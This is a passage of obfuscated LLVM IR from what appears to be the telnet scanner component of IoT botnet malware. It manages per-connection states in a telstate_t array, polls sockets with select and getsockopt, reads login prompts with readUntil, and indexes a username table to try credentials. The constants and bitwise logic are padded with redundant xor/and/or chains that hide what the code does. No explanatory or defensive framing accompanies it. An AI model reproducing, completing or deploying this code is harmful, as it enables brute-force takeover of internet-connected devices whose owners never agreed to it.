  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %294, i32 0, i32 0
  %296 = load i32, i32* %295, align 16
  %297 = sdiv i32 %296, 64
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds [16 x i64], [16 x i64]* %291, i64 0, i64 %298
  %300 = load i64, i64* %299, align 8
  %301 = xor i64 %300, -1
  %302 = xor i64 %290, -1
  %303 = xor i64 -5050696947721999113, -1
  %304 = and i64 %301, -5050696947721999113
  %305 = and i64 %300, %303
  %306 = and i64 %302, -5050696947721999113
  %307 = and i64 %290, %303
  %308 = or i64 %304, %305
  %309 = or i64 %306, %307
  %310 = xor i64 %308, %309
  %311 = or i64 %301, %302
  %312 = xor i64 %311, -1
  %313 = or i64 -5050696947721999113, %303
  %314 = and i64 %312, %313
  %315 = or i64 %310, %314
  %316 = or i64 %300, %290
  store i64 %315, i64* %299, align 8
  %317 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %317, align 8
  %318 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %318, align 8
  %319 = load i32, i32* %2, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 0
  %323 = load i32, i32* %322, align 16
  %324 = sub i32 0, 1
  %325 = sub i32 %323, %324
  %326 = add nsw i32 %323, 1
  %327 = call i32 @select(i32 %325, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %327, i32* %3, align 4
  %328 = load i32, i32* %3, align 4
  %329 = icmp eq i32 %328, 1
  br i1 %329, label %330, label %394

; <label>:330:                                    ; preds = %282
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %331 = load i32, i32* %2, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 0
  %335 = load i32, i32* %334, align 16
  %336 = bitcast i32* %7 to i8*
  %337 = call i32 @getsockopt(i32 %335, i32 1, i32 4, i8* %336, i32* %6) #2
  %338 = load i32, i32* %7, align 4
  %339 = icmp ne i32 %338, 0
  br i1 %339, label %340, label %355

; <label>:340:                                    ; preds = %330
  %341 = load i32, i32* %2, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 0
  %345 = load i32, i32* %344, align 16
  %346 = call i32 @sclose(i32 %345)
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 2
  store i8 0, i8* %350, align 8
  %351 = load i32, i32* %2, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 3
  store i8 1, i8* %354, align 1
  br label %393

; <label>:355:                                    ; preds = %330
  %356 = load i32, i32* %2, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 0
  %360 = load i32, i32* %359, align 16
  %361 = load i32, i32* %2, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %362
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %363, i32 0, i32 0
  %365 = load i32, i32* %364, align 16
  %366 = call i32 (i32, i32, ...) @fcntl(i32 %365, i32 3, i8* null)
  %367 = xor i32 %366, -1
  %368 = xor i32 -2049, -1
  %369 = xor i32 1978947809, -1
  %370 = or i32 %367, %368
  %371 = or i32 1978947809, %369
  %372 = xor i32 %370, -1
  %373 = and i32 %372, %371
  %374 = and i32 %366, -2049
  %375 = call i32 (i32, i32, ...) @fcntl(i32 %360, i32 4, i32 %373)
  %376 = load i32, i32* %2, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 6
  store i32 0, i32* %379, align 4
  %380 = load i32, i32* %2, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 7
  store i16 0, i16* %383, align 16
  %384 = load i32, i32* %2, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %385
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %386, i32 0, i32 8
  %388 = load i8*, i8** %387, align 8
  call void @llvm.memset.p0i8.i64(i8* %388, i8 0, i64 1024, i32 1, i1 false)
  %389 = load i32, i32* %2, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 2
  store i8 2, i8* %392, align 8
  br label %2366

; <label>:393:                                    ; preds = %340
  br label %413

; <label>:394:                                    ; preds = %282
  %395 = load i32, i32* %3, align 4
  %396 = icmp eq i32 %395, -1
  br i1 %396, label %397, label %412

; <label>:397:                                    ; preds = %394
  %398 = load i32, i32* %2, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %399
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %400, i32 0, i32 0
  %402 = load i32, i32* %401, align 16
  %403 = call i32 @sclose(i32 %402)
  %404 = load i32, i32* %2, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %405
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %406, i32 0, i32 2
  store i8 0, i8* %407, align 8
  %408 = load i32, i32* %2, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %409
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %410, i32 0, i32 3
  store i8 1, i8* %411, align 1
  br label %412

; <label>:412:                                    ; preds = %397, %394
  br label %413

; <label>:413:                                    ; preds = %412, %393
  %414 = load i32, i32* %2, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %415
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %416, i32 0, i32 6
  %418 = load i32, i32* %417, align 4
  %419 = add i32 %418, -1221948160
  %420 = add i32 %419, 10
  %421 = sub i32 %420, -1221948160
  %422 = add i32 %418, 10
  %423 = zext i32 %421 to i64
  %424 = call i64 @time(i64* null) #2
  %425 = icmp slt i64 %423, %424
  br i1 %425, label %426, label %441

; <label>:426:                                    ; preds = %413
  %427 = load i32, i32* %2, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %428
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %429, i32 0, i32 0
  %431 = load i32, i32* %430, align 16
  %432 = call i32 @sclose(i32 %431)
  %433 = load i32, i32* %2, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %434
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %435, i32 0, i32 2
  store i8 0, i8* %436, align 8
  %437 = load i32, i32* %2, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %438
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %439, i32 0, i32 3
  store i8 1, i8* %440, align 1
  br label %441

; <label>:441:                                    ; preds = %426, %413
  br label %2365

; <label>:442:                                    ; preds = %73
  %443 = load i32, i32* %2, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 6
  %447 = load i32, i32* %446, align 4
  %448 = icmp eq i32 %447, 0
  br i1 %448, label %449, label %456

; <label>:449:                                    ; preds = %442
  %450 = call i64 @time(i64* null) #2
  %451 = trunc i64 %450 to i32
  %452 = load i32, i32* %2, align 4
  %453 = sext i32 %452 to i64
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %453
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %454, i32 0, i32 6
  store i32 %451, i32* %455, align 4
  br label %456

; <label>:456:                                    ; preds = %449, %442
  %457 = load i32, i32* %2, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %458
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %459, i32 0, i32 0
  %461 = load i32, i32* %460, align 16
  %462 = load i32, i32* %2, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 8
  %466 = load i8*, i8** %465, align 8
  %467 = load i32, i32* %2, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %468
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %469, i32 0, i32 7
  %471 = load i16, i16* %470, align 16
  %472 = zext i16 %471 to i32
  %473 = call i32 @readUntil(i32 %461, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %466, i32 1024, i32 %472)
  %474 = icmp ne i32 %473, 0
  br i1 %474, label %475, label %507

; <label>:475:                                    ; preds = %456
  %476 = load i32, i32* %2, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %477
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %478, i32 0, i32 6
  store i32 0, i32* %479, align 4
  %480 = load i32, i32* %2, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 7
  store i16 0, i16* %483, align 16
  %484 = load i32, i32* %2, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 8
  %488 = load i8*, i8** %487, align 8
  %489 = call i8* @strstr(i8* %488, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %490 = icmp ne i8* %489, null
  br i1 %490, label %491, label %496

; <label>:491:                                    ; preds = %475
  %492 = load i32, i32* %2, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 2
  store i8 5, i8* %495, align 8
  br label %502

; <label>:496:                                    ; preds = %475
  %497 = load i32, i32* %2, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %498
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %499, i32 0, i32 8
  %501 = load i8*, i8** %500, align 8
  call void @llvm.memset.p0i8.i64(i8* %501, i8 0, i64 1024, i32 1, i1 false)
  br label %502

; <label>:502:                                    ; preds = %496, %491
  %503 = load i32, i32* %2, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 2
  store i8 3, i8* %506, align 8
  br label %2366

; <label>:507:                                    ; preds = %456
  %508 = load i32, i32* %2, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 0
  %512 = load i32, i32* %511, align 16
  %513 = load i32, i32* %2, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 8
  %517 = load i8*, i8** %516, align 8
  %518 = load i32, i32* %2, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %519
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %520, i32 0, i32 7
  %522 = load i16, i16* %521, align 16
  %523 = zext i16 %522 to i32
  %524 = call i32 @readUntil(i32 %512, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %517, i32 1024, i32 %523)
  %525 = icmp ne i32 %524, 0
  br i1 %525, label %526, label %558

; <label>:526:                                    ; preds = %507
  %527 = load i32, i32* %2, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %528
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %529, i32 0, i32 6
  store i32 0, i32* %530, align 4
  %531 = load i32, i32* %2, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %532
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %533, i32 0, i32 7
  store i16 0, i16* %534, align 16
  %535 = load i32, i32* %2, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 8
  %539 = load i8*, i8** %538, align 8
  %540 = call i8* @strstr(i8* %539, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %541 = icmp ne i8* %540, null
  br i1 %541, label %542, label %547

; <label>:542:                                    ; preds = %526
  %543 = load i32, i32* %2, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %544
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %545, i32 0, i32 2
  store i8 5, i8* %546, align 8
  br label %553

; <label>:547:                                    ; preds = %526
  %548 = load i32, i32* %2, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 8
  %552 = load i8*, i8** %551, align 8
  call void @llvm.memset.p0i8.i64(i8* %552, i8 0, i64 1024, i32 1, i1 false)
  br label %553

; <label>:553:                                    ; preds = %547, %542
  %554 = load i32, i32* %2, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 2
  store i8 3, i8* %557, align 8
  br label %2366

; <label>:558:                                    ; preds = %507
  %559 = load i32, i32* %2, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 0
  %563 = load i32, i32* %562, align 16
  %564 = load i32, i32* %2, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 8
  %568 = load i8*, i8** %567, align 8
  %569 = load i32, i32* %2, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %570
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %571, i32 0, i32 7
  %573 = load i16, i16* %572, align 16
  %574 = zext i16 %573 to i32
  %575 = call i32 @readUntil(i32 %563, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %568, i32 1024, i32 %574)
  %576 = icmp ne i32 %575, 0
  br i1 %576, label %577, label %609

; <label>:577:                                    ; preds = %558
  %578 = load i32, i32* %2, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 6
  store i32 0, i32* %581, align 4
  %582 = load i32, i32* %2, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %583
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %584, i32 0, i32 7
  store i16 0, i16* %585, align 16
  %586 = load i32, i32* %2, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 8
  %590 = load i8*, i8** %589, align 8
  %591 = call i8* @strstr(i8* %590, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %592 = icmp ne i8* %591, null
  br i1 %592, label %593, label %598

; <label>:593:                                    ; preds = %577
  %594 = load i32, i32* %2, align 4
  %595 = sext i32 %594 to i64
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %595
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %596, i32 0, i32 2
  store i8 5, i8* %597, align 8
  br label %604

; <label>:598:                                    ; preds = %577
  %599 = load i32, i32* %2, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %600
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %601, i32 0, i32 8
  %603 = load i8*, i8** %602, align 8
  call void @llvm.memset.p0i8.i64(i8* %603, i8 0, i64 1024, i32 1, i1 false)
  br label %604

; <label>:604:                                    ; preds = %598, %593
  %605 = load i32, i32* %2, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 2
  store i8 3, i8* %608, align 8
  br label %2366

; <label>:609:                                    ; preds = %558
  %610 = load i32, i32* %2, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 0
  %614 = load i32, i32* %613, align 16
  %615 = load i32, i32* %2, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %616
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %617, i32 0, i32 8
  %619 = load i8*, i8** %618, align 8
  %620 = load i32, i32* %2, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 7
  %624 = load i16, i16* %623, align 16
  %625 = zext i16 %624 to i32
  %626 = call i32 @readUntil(i32 %614, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %619, i32 1024, i32 %625)
  %627 = icmp ne i32 %626, 0
  br i1 %627, label %628, label %660

; <label>:628:                                    ; preds = %609
  %629 = load i32, i32* %2, align 4
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %630
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %631, i32 0, i32 6
  store i32 0, i32* %632, align 4
  %633 = load i32, i32* %2, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 7
  store i16 0, i16* %636, align 16
  %637 = load i32, i32* %2, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %638
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %639, i32 0, i32 8
  %641 = load i8*, i8** %640, align 8
  %642 = call i8* @strstr(i8* %641, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %643 = icmp ne i8* %642, null
  br i1 %643, label %644, label %649

; <label>:644:                                    ; preds = %628
  %645 = load i32, i32* %2, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 2
  store i8 5, i8* %648, align 8
  br label %655

; <label>:649:                                    ; preds = %628
  %650 = load i32, i32* %2, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 8
  %654 = load i8*, i8** %653, align 8
  call void @llvm.memset.p0i8.i64(i8* %654, i8 0, i64 1024, i32 1, i1 false)
  br label %655

; <label>:655:                                    ; preds = %649, %644
  %656 = load i32, i32* %2, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 2
  store i8 3, i8* %659, align 8
  br label %2366

; <label>:660:                                    ; preds = %609
  %661 = load i32, i32* %2, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %662
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %663, i32 0, i32 0
  %665 = load i32, i32* %664, align 16
  %666 = load i32, i32* %2, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %667
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %668, i32 0, i32 8
  %670 = load i8*, i8** %669, align 8
  %671 = load i32, i32* %2, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 7
  %675 = load i16, i16* %674, align 16
  %676 = zext i16 %675 to i32
  %677 = call i32 @readUntil(i32 %665, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %670, i32 1024, i32 %676)
  %678 = icmp ne i32 %677, 0
  br i1 %678, label %679, label %711

; <label>:679:                                    ; preds = %660
  %680 = load i32, i32* %2, align 4
  %681 = sext i32 %680 to i64
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %681
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %682, i32 0, i32 6
  store i32 0, i32* %683, align 4
  %684 = load i32, i32* %2, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %685
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %686, i32 0, i32 7
  store i16 0, i16* %687, align 16
  %688 = load i32, i32* %2, align 4
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %689
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %690, i32 0, i32 8
  %692 = load i8*, i8** %691, align 8
  %693 = call i8* @strstr(i8* %692, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %694 = icmp ne i8* %693, null
  br i1 %694, label %695, label %700

; <label>:695:                                    ; preds = %679
  %696 = load i32, i32* %2, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %697
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %698, i32 0, i32 2
  store i8 5, i8* %699, align 8
  br label %706

; <label>:700:                                    ; preds = %679
  %701 = load i32, i32* %2, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 8
  %705 = load i8*, i8** %704, align 8
  call void @llvm.memset.p0i8.i64(i8* %705, i8 0, i64 1024, i32 1, i1 false)
  br label %706

; <label>:706:                                    ; preds = %700, %695
  %707 = load i32, i32* %2, align 4
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %708
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %709, i32 0, i32 2
  store i8 3, i8* %710, align 8
  br label %2366

; <label>:711:                                    ; preds = %660
  %712 = load i32, i32* %2, align 4
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %713
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %714, i32 0, i32 8
  %716 = load i8*, i8** %715, align 8
  %717 = call i64 @strlen(i8* %716) #10
  %718 = trunc i64 %717 to i16
  %719 = load i32, i32* %2, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %720
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %721, i32 0, i32 7
  store i16 %718, i16* %722, align 16
  br label %723

; <label>:723:                                    ; preds = %711
  br label %724

; <label>:724:                                    ; preds = %723
  br label %725

; <label>:725:                                    ; preds = %724
  br label %726

; <label>:726:                                    ; preds = %725
  br label %727

; <label>:727:                                    ; preds = %726
  %728 = load i32, i32* %2, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 6
  %732 = load i32, i32* %731, align 4
  %733 = sub i32 0, 10
  %734 = sub i32 %732, %733
  %735 = add i32 %732, 10
  %736 = zext i32 %734 to i64
  %737 = call i64 @time(i64* null) #2
  %738 = icmp slt i64 %736, %737
  br i1 %738, label %739, label %754

; <label>:739:                                    ; preds = %727
  %740 = load i32, i32* %2, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %741
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %742, i32 0, i32 0
  %744 = load i32, i32* %743, align 16
  %745 = call i32 @sclose(i32 %744)
  %746 = load i32, i32* %2, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 2
  store i8 0, i8* %749, align 8
  %750 = load i32, i32* %2, align 4
  %751 = sext i32 %750 to i64
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %751
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %752, i32 0, i32 3
  store i8 1, i8* %753, align 1
  br label %754

; <label>:754:                                    ; preds = %739, %727
  br label %2365

; <label>:755:                                    ; preds = %73
  %756 = load i32, i32* %2, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 0
  %760 = load i32, i32* %759, align 16
  %761 = load i32, i32* %2, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 4
  %765 = load i8, i8* %764, align 2
  %766 = zext i8 %765 to i64
  %767 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %766
  %768 = load i8*, i8** %767, align 8
  %769 = load i32, i32* %2, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %770
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %771, i32 0, i32 4
